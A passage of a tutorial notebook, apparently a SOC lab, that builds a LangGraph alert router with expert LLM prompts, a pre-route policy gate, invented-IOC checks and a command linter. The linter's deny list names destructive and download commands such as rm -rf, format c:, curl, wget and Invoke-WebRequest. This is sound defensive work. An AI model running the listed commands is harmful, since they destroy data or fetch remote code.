      "cell_type": "markdown",
      "source": [
        "#### Exper prompts\n",
        "\n",
        "- **system message** sets the role of the assistant (phishing analyst, malware analyst, cloud analyst).\n",
        "- **user message** defines the task (summarize, give mitigations/remediations)."
      ],
      "metadata": {
        "id": "LA6_3D0Ubhx_"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "PHISH_SYS = \"You are a phishing analyst. Be concise and actionable.\"\n",
        "PHISH_USER = \"\"\"Summarize suspected phishing activity and propose 3 mitigations.\n",
        "Do not invent IOCs.\n",
        "Alert:\n",
        "{alert}\"\"\"\n",
        "\n",
        "MAL_SYS = \"You are a malware incident response analyst. Be specific.\"\n",
        "MAL_USER = \"\"\"Summarize likely malware activity and propose 3 concrete response actions.\n",
        "Do not invent IOCs.\n",
        "Alert:\n",
        "{alert}\"\"\"\n",
        "\n",
        "MISCONF_SYS = \"You are a cloud security analyst. Be concise.\"\n",
        "MISCONF_USER = \"\"\"Explain the misconfiguration, risk, and 3 remediation steps.\n",
        "Alert:\n",
        "{alert}\"\"\""
      ],
      "metadata": {
        "id": "6I7uBnZRbi6_"
      },
      "execution_count": 26,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Expert handlers\n",
        "\n",
        "Each handler calls an **expert model** with the relevant prompt.\n",
        "\n",
        "\n",
        "**Returns an Envelope with:**\n",
        "\n",
        "- route fixed (e.g., \"phishing\"),\n",
        "- answer = model's output,\n",
        "- confidence = a set value (0.8 here).\n",
        "\n",
        "\n",
        "**Handlers include:**\n",
        "\n",
        "- handle_phishing\n",
        "- handle_malware\n",
        "- handle_misconfig\n",
        "- handle_blocked → no LLM, just marks “blocked by policy.”\n",
        "- handle_abstain → signals escalation to a human analyst."
      ],
      "metadata": {
        "id": "yv_w7uwjb9-c"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def handle_phishing(text):\n",
        "    ans = call(MODEL_EXPERT, [\n",
        "        {\"role\":\"system\",\"content\":PHISH_SYS},\n",
        "        {\"role\":\"user\",\"content\":PHISH_USER.format(alert=text)}\n",
        "    ], max_tokens=260)\n",
        "    return Envelope(route=\"phishing\", answer=ans, confidence=0.8).model_dump()\n",
        "\n",
        "\n",
        "def handle_malware(text):\n",
        "    ans = call(MODEL_EXPERT, [\n",
        "        {\"role\":\"system\",\"content\":MAL_SYS},\n",
        "        {\"role\":\"user\",\"content\":MAL_USER.format(alert=text)}\n",
        "    ], max_tokens=260)\n",
        "    return Envelope(route=\"malware\", answer=ans, confidence=0.8).model_dump()\n",
        "\n",
        "\n",
        "def handle_misconfig(text):\n",
        "    ans = call(MODEL_EXPERT, [\n",
        "        {\"role\":\"system\",\"content\":MISCONF_SYS},\n",
        "        {\"role\":\"user\",\"content\":MISCONF_USER.format(alert=text)}\n",
        "    ], max_tokens=260)\n",
        "    return Envelope(route=\"misconfig\", answer=ans, confidence=0.8).model_dump()\n",
        "\n",
        "\n",
        "def handle_blocked(reason):\n",
        "    return Envelope(route=\"blocked\", answer=\"Blocked by policy.\", confidence=0.99,\n",
        "                    extras={\"reason\":reason}).model_dump()\n",
        "\n",
        "\n",
        "def handle_abstain(reason):\n",
        "    return Envelope(route=\"abstain\", answer=\"Escalated to human analyst.\", confidence=0.4,\n",
        "                    extras={\"reason\":reason,\"handoff\":\"human_security_analyst\"}).model_dump()\n"
      ],
      "metadata": {
        "id": "_RByk2JAcHAH"
      },
      "execution_count": 27,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Dispatch node\n",
        "\n",
        "By this stage, the router (rules/embeddings/LLM) has already chosen a decision.\n",
        "\n",
        "- `dispatch_node` **calls** the corresponding **expert handler**.\n",
        "- **Produces an envelope** ready for downstream use.\n",
        "- This is where **classification turns into action**. Yes, simple **if**s."
      ],
      "metadata": {
        "id": "-06OuRaNcGwV"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def dispatch_node(state):\n",
        "    d = state[\"decision\"]\n",
        "    text = state[\"text\"]\n",
        "\n",
        "    if d[\"route\"] == \"phishing\":  env = handle_phishing(text)\n",
        "    elif d[\"route\"] == \"malware\": env = handle_malware(text)\n",
        "    elif d[\"route\"] == \"misconfig\": env = handle_misconfig(text)\n",
        "    elif d[\"route\"] == \"blocked\": env = handle_blocked(d[\"reason\"])\n",
        "    else: env = handle_abstain(d[\"reason\"])\n",
        "\n",
        "    return {\"envelope\": env}"
      ],
      "metadata": {
        "id": "2yM_uyOwc9Ft"
      },
      "execution_count": 28,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### FullState\n",
        "\n",
        "Every graph needs a state type: a dict (or TypedDict) that describes what pieces of information will be passed from node to node. Brielfy - it's a container with info that travels through graph.\n",
        "\n",
        "\n",
        "State now includes:\n",
        "- the input text\n",
        "- the routing decision\n",
        "- the final envelope."
      ],
      "metadata": {
        "id": "2fJKNee4dMX8"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class FullState(TypedDict):\n",
        "    text: str\n",
        "    decision: Optional[dict]\n",
        "    envelope: Optional[dict]"
      ],
      "metadata": {
        "id": "Q9ZJzdLdd5-C"
      },
      "execution_count": 29,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Graph setup\n",
        "\n",
        "\n",
        "As before - it defines the workflow graph.\n",
        "\n",
        "- Nodes: rules, embed, llm, dispatch.\n",
        "- Entry point: always start with rules."
      ],
      "metadata": {
        "id": "1XicullUeC29"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "g4 = StateGraph(FullState)\n",
        "\n",
        "for name, node in [\n",
        "    (\"rules\", rules_node),\n",
        "    (\"embed\", embed_node),\n",
        "    (\"llm\", llm_node),\n",
        "    (\"dispatch\", dispatch_node)\n",
        "]:\n",
        "    g4.add_node(name, node)\n",
        "\n",
        "g4.set_entry_point(\"rules\")\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "0tUDh12feIJB",
        "outputId": "a01e7271-a6b7-4e74-f6f6-7f9e7af149b6"
      },
      "execution_count": 30,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<langgraph.graph.state.StateGraph at 0x7a8ced1548f0>"
            ]
          },
          "metadata": {},
          "execution_count": 30
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Conditional Edges\n",
        "\n",
        "**After rules:**\n",
        "- If it classified → go to dispatch.\n",
        "- If abstained → go to embed.\n",
        "\n",
        "**After embed:**\n",
        "- If it classified → go to dispatch.\n",
        "- If abstained → go to llm.\n",
        "\n",
        "**After llm**: → always go to dispatch.\n",
        "\n",
        "**After dispatch**: → stop (END).\n",
        "\n",
        "\n",
        "Flow is: `rules → embed (if abstain) → llm (if abstain) → dispatch → END`\n"
      ],
      "metadata": {
        "id": "mOJC3xY-eQfV"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def next_rules(s):\n",
        "  return \"embed\" if s[\"decision\"][\"route\"]==\"abstain\" else \"dispatch\"\n",
        "def next_embed(s):\n",
        "  return \"llm\" if s[\"decision\"][\"route\"]==\"abstain\" else \"dispatch\""
      ],
      "metadata": {
        "id": "601ClLX2ejpc"
      },
      "execution_count": 31,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "g4.add_conditional_edges(\"rules\", next_rules, {\"embed\":\"embed\", \"dispatch\":\"dispatch\"})\n",
        "g4.add_conditional_edges(\"embed\", next_embed, {\"llm\":\"llm\", \"dispatch\":\"dispatch\"})\n",
        "g4.add_edge(\"llm\", \"dispatch\")\n",
        "g4.add_edge(\"dispatch\", END)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ohXgCUhjeTVZ",
        "outputId": "19d1b8d8-cca6-46ef-a318-b5fb08a277a8"
      },
      "execution_count": 32,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<langgraph.graph.state.StateGraph at 0x7a8ced1548f0>"
            ]
          },
          "metadata": {},
          "execution_count": 32
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Try it!\n",
        "Whats the flow?\n",
        "- `app4.invoke` runs the workflow for each test alert.\n",
        "- Starts at rules, flows through embed/llm if needed, then dispatch.\n",
        "- dispatch calls the right expert, produces an Envelope.\n",
        "- `Envelope(**...)` checks the result matches the schema."
      ],
      "metadata": {
        "id": "NaR3wve-eyEx"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "app4 = g4.compile()\n",
        "\n",
        "for label, text in TEST_ALERTS:\n",
        "    out = app4.invoke({\"text\": text, \"decision\": None, \"envelope\": None})\n",
        "    env = Envelope(**out[\"envelope\"])  # validated via Pydantic\n",
        "    print(label, \"→\", env.route, \"|\", env.answer[:80], \"...\")\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "W61lf0RhfFx1",
        "outputId": "b26d36b6-e891-4e59-e4df-26cb3446b481"
      },
      "execution_count": 33,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "phishing → phishing | **Suspected Phishing Activity:**\n",
            "- User received an email urging immediate passw ...\n",
            "malware → malware | ### Summary of Likely Malware Activity\n",
            "\n",
            "The alert indicates the following suspic ...\n",
            "misconfig → misconfig | **Misconfiguration:**\n",
            "The S3 bucket `s3://acme-data` has been configured with a  ...\n",
            "blocked → blocked | Blocked by policy. ...\n",
            "unknown → abstain | Escalated to human analyst. ...\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### TL:DR\n",
        "\n",
        "\n",
        "In this Lab we **connect routing and specialist experts**. Experts produce structured summaries + recommended actions, constrained by their prompts.\n",
        "\n",
        "**Routing decides** who should handle the alert. `dispatch_node` **sends the alert to the correct expert**. Thus we move from just classification to actionable expert output.\n",
        "\n",
        "The result is wrapped in a **consistent Envelope schema.** Even blocked or abstain produce valid envelopes, with metadata. This has everything standardized with Pydantic validation and keeps the system **modular and scalable**: router can grow (new routes), experts can grow (new handlers)."
      ],
      "metadata": {
        "id": "nnWfBlSWfV1o"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### **Lab 5 Safety, Post-Checks, and Human Handoff**\n",
        "\n",
        "\n",
        "In this part we'll add guardrails so the system can:\n",
        "\n",
        "- **Block** unsafe inputs early (policy gate).\n",
        "\n",
        "- **Detect** unsafe/unsupported outputs after experts write (post-checks).\n",
        "\n",
        "- **Abstain** + **escalate** to a human analyst with a clear handoff package when needed.\n",
        "\n",
        "This turns router from 'smart' into **trustworthy** which is really important in SOC."
      ],
      "metadata": {
        "id": "jnq8pmAiVRVF"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **Why this matters**\n",
        "\n",
        "**Previous** routing Labs **pick the right expert** and returns a consistent Envelope.\n",
        "\n",
        "**Now**: we must **ensure safe** behavior:\n",
        "\n",
        "- **Pre-route**: prevent processing disallowed content.\n",
        "\n",
        "- **Post-route**: prevent hallucinated IOCs, risky commands, or format violations.\n",
        "\n",
        "- **Handoff**: send to human when uncertain or unsafe, don't guess—escalate with context.\n",
        "\n"
      ],
      "metadata": {
        "id": "K2Mgqa6wVS4u"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **Skills**\n",
        "\n",
        "- Pre-route policy gating (blocklists, regex, light classifiers).\n",
        "\n",
        "- Post-generation validation (detectors/linters vs the expert’s output).\n",
        "\n",
        "- Abstain & escalate patterns (with metadata).\n",
        "\n",
        "- Safety metadata contracts to standardize incident tickets."
      ],
      "metadata": {
        "id": "4ILtDFADWk5C"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **Goal**\n",
        "\n",
        "- Add a **Safety Node** after `dispatch` that can **accept, repair, or escalate** the expert output.\n",
        "\n",
        "- Add **metadata** so meatbags receive a clean ticket: what failed, why, what to do next.\n",
        "\n",
        "- Keep everything **schema-aligned** (Envelope).\n",
        "\n"
      ],
      "metadata": {
        "id": "RliuM_wQWlGB"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **System design**\n",
        "**Pre-route policy gate** (fast, cheap)\n",
        "\n",
        "  **Purpose:** stop processing obviously disallowed stuff before we spend tokens.\n",
        "  \n",
        "  **Rationale:** saves cost, lowers liability, creates an audit trail.\n",
        "\n",
        "  **Examples** (we do cybersec here):\n",
        "\n",
        "  - **IOCs**: crude regex for IPv4, hashes, defanged domains (to make sure we only process valid indicators and avoid hallucinations).Regex is broad and may catch false positives\n",
        "  - **Malware sharing**: base64 payloads over size threshold, raw shellcode, or explicit `build/ransomware` instructions.\n",
        "  - **Compliance triggers**: legal requests, export controls, or tenant boundary violations.\n",
        "\n",
        "*Outputs*\n",
        "\n",
        "```json\n",
        "{\n",
        "  \"route\": \"blocked\",\n",
        "  \"confidence\": 0.99,\n",
        "  \"reason\": \"ioc_policy_violation\",\n",
        "  \"policy_category\": \"ioc\",\n",
        "  \"recommended_action\": \"escalate\"\n",
        "}\n",
        "```\n",
        "\n",
        "\n",
        "**Post-route safety checks** (after experts)\n",
        "\n",
        "**Purpose**: reject/abstain when the expert output is unsafe, unsupported, or unverifiable.\n",
        "\n",
        "*Common SOC checks:*\n",
        "\n",
        "- **No-new-IOCs**: Extract IOCs from input alert; ensure expert didn't invent new IPs/domains/hashes.\n",
        "\n",
        "- **Command linter**: Disallow dangerous ops in the wrong context (like `Invoke-WebRequest` in a phishing summary `rm -rf` anywhere or data-destructive SQL).\n",
        "\n",
        "- **Claim-vs-source consistency**: For RAG/DB-backed flows, require citations for each claim to make sure we avoid hallucniations or retirever / generator failures, otherwise mark as unsupported.\n",
        "\n",
        "- **Format/schema check**: Envelope must pass Pydantic, required sections must exist following the structire, length constraints respected.\n",
        "\n",
        "- **Language/style**: No sensitive info in output, no company/.env secrets sent.\n",
        "\n",
        "**Outcomes:**\n",
        "\n",
        "- **Pass**: return Envelope unchanged.\n",
        "- **Auto-repair** (optional): ask a tiny revision prompt (\"remove unsupported IOCs, keep content\") - be carefull since it might start rewriting or hallucinating.\n",
        "- **Escalate** (mostly for SOC): set `route=\"abstain\"`, keep answer minimal, include `extras` with failure details.\n",
        "\n",
        "\n",
        "**Abstain & Human Handoff**\n",
        "\n",
        "When failing post-checks or low confidence:\n",
        "\n",
        "- **Do not** return a risky answer.\n",
        "\n",
        "- Return an **abstain Envelope** equipped for an analyst to pick up.\n",
        "\n",
        "**Handoff package fields** (in extras):\n",
        "\n",
        "- `handoff: \"human_security_analyst\"`\n",
        "\n",
        "- `reason`: short (like `\"new_iocs_detected\"`, `\"low_confidence\"`)\n",
        "\n",
        "- `policy_category`: if relevant (`\"ioc\"`, `\"malware_disallowed_content\"`)\n",
        "\n",
        "- `recommended_action`: `\"escalate\" | \"revise\" | \"drop\"`\n",
        "\n",
        "- `context`: minimal necessary inputs (original alert snippet, expert draft, failed checks)\n",
        "\n",
        "- `check_results`: like list of new IOCs, forbidden commands found\n",
        "\n",
        "- `stage`: `\"postcheck\"`\n",
        "\n",
        "- Possibly optional extras: `severity_guess`, `service_owner`, `playbook_hint`"
      ],
      "metadata": {
        "id": "RsrbPtfMbA-l"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### **What to return (Contracts)**\n",
        "\n",
        "Everything still returns a valid **Envelope**:\n",
        "\n",
        "**Pass** → `route` remains (`phishing|malware|misconfig`)\n",
        "\n",
        "**Blocked** → `route=\"blocked\"`, `extras.reason`, `policy_category`\n",
        "\n",
        "**Abstain** → `route=\"abstain\"`, `extras.handoff=\"human_security_analyst\"`, `extras.reason`, `recommended_action`\n",
        "\n",
        "The **schema never changes**, only values change."
      ],
      "metadata": {
        "id": "vn8M8M2Hn2P0"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **Flow**\n",
        "\n",
        "```\n",
        "   (Entry)\n",
        "     │\n",
        "     ▼\n",
        " [ policy_gate (pre-route) ]\n",
        "     │\n",
        "     ├── if blocked ───────────────> [ dispatch(blocked) ] ──> END\n",
        "     │\n",
        "     └── else\n",
        "           │\n",
        "           ▼\n",
        "       [ rules_node ]\n",
        "           │\n",
        "           ├── classified ──> [ dispatch ] ──> [ safety_postchecks ] ─> END\n",
        "           │\n",
        "           └── abstain\n",
        "                  │\n",
        "                  ▼\n",
        "            [ embed_node ]\n",
        "                  │\n",
        "                  ├── classified ──> [ dispatch ] ──> [ safety_postchecks ] ─> END\n",
        "                  │\n",
        "                  └── abstain\n",
        "                         │\n",
        "                         ▼\n",
        "                    [ llm_node ]\n",
        "                         │\n",
        "                         ▼\n",
        "                    [ dispatch ] ──> [ safety_postchecks ] ─> END\n",
        "\n",
        "```"
      ],
      "metadata": {
        "id": "2Gcw9UyEoOtL"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **What to check**\n",
        "**No-new-IOCs (hallucination guard)**: If answer_IOCs - source_IOCs is non-empty → **fail & escalate**.\n",
        "\n",
        "**Command safety lint**: Disallow destructive or dangerous commands (route-aware).\n",
        "\n",
        "**Structure/length**: Enforce schema compliance & size limits.\n",
        "\n",
        "**Confidence thresholds**: If router or expert confidence < threshold, abstain + escalate."
      ],
      "metadata": {
        "id": "7o0vE2IloWyc"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### **Lab 5 practice**\n",
        "\n"
      ],
      "metadata": {
        "id": "GnRPBzYjqVH8"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **Pre-route Policy Gate**\n",
        "\n",
        "To briefly repeat, it's a cheap policy **filter** that blocks obviously disallowed content **before** we spend tokens on routing/experts.\n",
        "\n",
        "**What it does**\n",
        "\n",
        "- Uses a regex to detect.\n",
        "\n",
        "- If matched, immediately returns a **blocked** Envelope with metadata (`reason, policy_category, recommended_action, stage`).\n",
        "\n",
        "- If not matched, it **passes through** and lets the router run.\n",
        "\n",
        "**Why it matters**\n",
        "\n",
        "Saves **cost/latency**, reduces **risk/liability**, and produces a clear **audit trail** for policy actions.\n",
        "\n",
        "In SOC, **blocking early** prevents accidental processing, storage, or display of sensitive data."
      ],
      "metadata": {
        "id": "IobFcKLeqiF-"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **IOC helpers**\n",
        "\n",
        "What: Utilities to normalize/parse IOCs consistently (so post-checks are reliable).\n",
        "Why: Alerts/answers may use defanged forms; normalizing prevents false “new IOC” flags."
      ],
      "metadata": {
        "id": "k9RReDkSyQbj"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import re\n",
        "\n",
        "# IPv4, hashes (MD5/SHA1/SHA256), and defanged domains like acme[.]com\n",
        "IOC_PAT = re.compile(\n",
        "    r\"\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b\"          # IPv4 (loose)\n",
        "    r\"|[A-Fa-f0-9]{32,64}\"                  # hashes (32..64 hex)\n",
        "    r\"|[a-zA-Z0-9-]+\\[.\\][a-z]{2,}\\b\"       # defanged domains\n",
        ")\n",
        "\n",
        "DEFANGED_DOT = re.compile(r\"\\[\\.\\]\")\n",
        "def refang(s: str) -> str:\n",
        "    \"\"\"Turn [.] into . for consistent matching/comparison.\"\"\"\n",
        "    return DEFANGED_DOT.sub(\".\", s)\n",
        "\n",
        "def extract_iocs(text: str) -> set[str]:\n",
        "    \"\"\"Find IOCs (after refanging) and return a set.\"\"\"\n",
        "    return set(IOC_PAT.findall(refang(text or \"\")))\n"
      ],
      "metadata": {
        "id": "b4aS6hTwbApc"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **IOC Policy Gate**\n",
        "\n",
        "**What**: A cheap pre-route node that performs quick IOC hygiene checks.\n",
        "\n",
        "**Why**: Prevent wasting tokens on obviously unscoped inputs (like giant base64 dumps) and annotate IOC context early.\n",
        "\n"
      ],
      "metadata": {
        "id": "jf9oKtKjyjwl"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Simple bulk/base64 screens to avoid heavy LLM use on bulk IOC dumps or raw blobs\n",
        "BASE64_BLOB = re.compile(r\"(?:[A-Za-z0-9+/]{80,}={0,2})\")\n",
        "MAX_IOCS_BEFORE_ESCALATE = 200\n",
        "\n",
        "def policy_gate_node(state: FullState):\n",
        "    text = state[\"text\"]\n",
        "\n",
        "    # 1) Massive base64 blob → block (manual triage)\n",
        "    if BASE64_BLOB.search(text):\n",
        "        env = Envelope(\n",
        "            route=\"blocked\",\n",
        "            answer=\"Blocked by policy (large base64 blob).\",\n",
        "            confidence=0.99,\n",
        "            extras={\n",
        "                \"reason\": \"ioc_policy_violation:base64_blob\",\n",
        "                \"policy_category\": \"ioc\",\n",
        "                \"recommended_action\": \"escalate\",\n",
        "                \"stage\": \"policy_gate\"\n",
        "            }\n",
        "        ).model_dump()\n",
        "        return {\"decision\": {\"route\":\"blocked\",\"confidence\":0.99,\"reason\":\"base64_blob\"}, \"envelope\": env}\n",
        "\n",
        "    # 2) Massive IOC dump → block (bulk ingestion pipeline, not analyst summary)\n",
        "    iocs = extract_iocs(text)\n",
        "    if len(iocs) > MAX_IOCS_BEFORE_ESCALATE:\n",
        "        env = Envelope(\n",
        "            route=\"blocked\",\n",
        "            answer=f\"Blocked by policy (bulk IOC dump: {len(iocs)} IOCs).\",\n",
        "            confidence=0.99,\n",
        "            extras={\n",
        "                \"reason\": \"ioc_policy_violation:bulk_dump\",\n",
        "                \"policy_category\": \"ioc\",\n",
        "                \"ioc_count\": len(iocs),\n",
        "                \"recommended_action\": \"escalate\",\n",
        "                \"stage\": \"policy_gate\"\n",
        "            }\n",
        "        ).model_dump()\n",
        "        return {\"decision\": {\"route\":\"blocked\",\"confidence\":0.99,\"reason\":\"bulk_ioc_dump\"}, \"envelope\": env}\n",
        "\n",
        "    # 3) Pass through; keep extracted IOCs as context (helps debugging/analytics)\n",
        "    return {\"extras_policy\": {\"source_iocs\": list(iocs), \"stage\": \"policy_gate_pass\"}}\n"
      ],
      "metadata": {
        "id": "mzGXGc-6yhsE"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **Post-route safety checks**\n",
        "After dispatch, we have the expert's text.\n",
        "\n",
        "**What**: Guardrails to **prevent hallucinated IOCs** and **disallowe commands** in answers.\n",
        "**Why**: In SOC, safer to **abstain than to return** an unsupported indicator or risky command."
      ],
      "metadata": {
        "id": "vr7Klg3bGH9Q"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Route-aware forbidden commands: for practice we use simple ones\n",
        "FORBIDDEN_CMDS = [\n",
        "    r\"\\brm\\s+-rf\\b\", r\"\\bformat\\s+c:\\b\", r\"\\bwipe\\b\",\n",
        "    r\"\\bInvoke-WebRequest\\b\", r\"\\bcurl\\b\", r\"\\bwget\\b\", r\"\\biwr\\b\", r\"\\bpowershell\\b\"\n",
        "]\n",
        "CMD_PAT = re.compile(\"|\".join(FORBIDDEN_CMDS), re.IGNORECASE)\n",
        "\n",
        "def postcheck_no_new_iocs(alert_text: str, answer_text: str) -> tuple[bool, list[str]]:\n",
        "    src = extract_iocs(alert_text)\n",
        "    out = extract_iocs(answer_text)\n",
        "    new = list(out - src)\n",
        "    return len(new) == 0, new\n",
        "\n",
        "def command_linter(route: str, answer_text: str) -> tuple[bool, list[str]]:\n",
        "    hits = list(set(CMD_PAT.findall(answer_text or \"\")))\n",
        "    if not hits:\n",
        "        return True, []\n",
        "    # fail on any hit\n",
        "    return False, hits\n"
      ],
      "metadata": {
        "id": "S0tAPktgGHUJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **Safety node**\n",
        "We already wire dispatch to produce an Envelope.\n",
        "\n",
        "**What**: A node that **accepts or escalates** the envelope **based on safety checks**.\n",
        "\n",
        "**Why**: Ensures we only return **trustworthy answers**, otherwise `abstain + handoff`"
      ],
      "metadata": {
        "id": "D0PR5oJ0GuzS"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def safety_node(state: FullState):\n",
        "    env = state[\"envelope\"]\n",
        "    # If policy gate already blocked, return envelope\n",
        "    if env and env.get(\"route\") == \"blocked\":\n",
        "        return {\"envelope\": env}\n",
        "\n",
        "    # Only check expert routes\n",
        "    if env and env[\"route\"] in {\"phishing\",\"malware\",\"misconfig\"}:\n",
        "        ok_ioc, new_iocs = postcheck_no_new_iocs(state[\"text\"], env[\"answer\"])\n",
        "        ok_cmd, bad_cmds = command_linter(env[\"route\"], env[\"answer\"])\n",
        "\n",
        "        if not (ok_ioc and ok_cmd):\n",
        "            env[\"route\"] = \"abstain\"\n",
        "            env[\"answer\"] = \"Escalated to human due to safety/post-check failure.\"\n",
        "            env[\"confidence\"] = min(env.get(\"confidence\", 0.6), 0.6)\n",
        "            env[\"extras\"][\"handoff\"] = \"human_security_analyst\"\n",
        "            env[\"extras\"][\"postcheck\"] = \"failed\"\n",
        "            env[\"extras\"][\"check_results\"] = {}\n",
        "            if not ok_ioc: env[\"extras\"][\"check_results\"][\"new_iocs\"] = new_iocs\n",
        "            if not ok_cmd: env[\"extras\"][\"check_results\"][\"forbidden_commands\"] = bad_cmds\n",
        "            env[\"extras\"][\"recommended_action\"] = \"escalate\"\n",
        "            env[\"extras\"][\"stage\"] = \"postcheck\"\n",
        "    return {\"envelope\": env}\n"
      ],
      "metadata": {
        "id": "emLFo3J5HCij"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **Graph v5 wiring**\n",
        "`policy → router → experts → safety → END`\n",
        "\n",
        "Again - *StateGraph*, nodes, entry point, and conditional edges. All has been recapped previously.\n",
        "\n",
        "**What:** insert `policy_gate` **before** `routing` then always run **safety after dispatch**.\n",
        "\n",
        "**Why**: This makes the **lifecycle** explicit, readable and reviewable."
      ],
      "metadata": {
        "id": "3oXM7k7WHJRk"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def after_policy(state):\n",
        "    # Shortcut: if policy set a blocked envelope, jump to safety\n",
        "    env = state.get(\"envelope\")\n",
        "    if env and env.get(\"route\") == \"blocked\":\n",
        "        return \"safety\"\n",
        "    return \"rules\"\n",
        "\n",
        "\n",
        "def next_rules(s):\n",
        "    return \"embed\" if s[\"decision\"][\"route\"]==\"abstain\" else \"dispatch\"\n",
        "\n",
        "\n",
        "def next_embed(s):\n",
        "    return \"llm\" if s[\"decision\"][\"route\"]==\"abstain\" else \"dispatch\""
      ],
      "metadata": {
        "id": "dtfqo859Htu3"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "g5 = StateGraph(FullState)\n",
        "\n",
        "g5.add_node(\"policy_gate\", policy_gate_node)\n",
        "g5.add_node(\"rules\", rules_node)\n",
        "g5.add_node(\"embed\", embed_node)\n",
        "g5.add_node(\"llm\", llm_node)\n",
        "g5.add_node(\"dispatch\", dispatch_node)\n",
        "g5.add_node(\"safety\", safety_node)\n",
        "\n",
        "g5.set_entry_point(\"policy_gate\")\n",
        "\n",
        "g5.add_conditional_edges(\"policy_gate\", after_policy, {\"safety\":\"safety\", \"rules\":\"rules\"})\n",
        "g5.add_conditional_edges(\"rules\", next_rules, {\"embed\":\"embed\", \"dispatch\":\"dispatch\"})\n",
        "g5.add_conditional_edges(\"embed\", next_embed, {\"llm\":\"llm\", \"dispatch\":\"dispatch\"})\n",
        "\n",
        "g5.add_edge(\"llm\", \"dispatch\")\n",
        "g5.add_edge(\"dispatch\", \"safety\")\n",
        "g5.add_edge(\"safety\", END)\n",
        "\n",
        "app5 = g5.compile()\n"
      ],
      "metadata": {
        "id": "xFj6zskCHJ6Z"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **Try it!**\n",
        "\n",
        "**What**: Three sanity runs: normal path, hallucination trap, and bulk/ blob block.\n",
        "**Why**: IOC-centric safety works end-to-end."
      ],
      "metadata": {
        "id": "J1Km9W_6IABz"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# (A) Base TEST_ALERTS\n",
        "print(\"=== TEST_ALERTS with IOC safety ===\")\n",
        "for label, text in TEST_ALERTS:\n",
        "    out = app5.invoke({\"text\": text, \"decision\": None, \"envelope\": None})\n",
        "    env = Envelope(**out[\"envelope\"])\n",
        "    print(f\"{label:9s} → {env.route:8s} | conf={env.confidence:.2f} | extras={env.extras}\")\n",
        "\n",
        "# (B) Hallucination test: alert with *no* IOCs; expert might invent some\n",
        "hallucination_alert = \"EDR notes suspicious script download attempt; no indicators provided.\"\n",
        "out = app5.invoke({\"text\": hallucination_alert, \"decision\": None, \"envelope\": None})\n",
        "env = Envelope(**out[\"envelope\"])\n",
        "print(\"\\n=== Hallucination test ===\")\n",
        "print(\"route:\", env.route, \"| extras:\", env.extras)\n",
        "\n",
        "# (C) Bulk/Blob tests (policy gate)\n",
        "bulk_iocs = \" \".join([f\"10.0.0.{i}\" for i in range(0, 250)])  # 250 IPv4 ⇒ blocked\n",
        "out = app5.invoke({\"text\": bulk_iocs, \"decision\": None, \"envelope\": None})\n",
        "env = Envelope(**out[\"envelope\"])\n",
        "print(\"\\n=== Bulk IOC dump test ===\")\n",
        "print(\"route:\", env.route, \"| extras:\", env.extras)\n",
        "\n",
        "blob = \"A\"*400 + \"==\"  # crude 'large base64' looking blob\n",
        "out = app5.invoke({\"text\": blob, \"decision\": None, \"envelope\": None})\n",
        "env = Envelope(**out[\"envelope\"])\n",
        "print(\"\\n=== Base64 blob test ===\")\n",
        "print(\"route:\", env.route, \"| extras:\", env.extras)\n"
      ],
      "metadata": {
        "id": "VbjQcOggIH1J"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}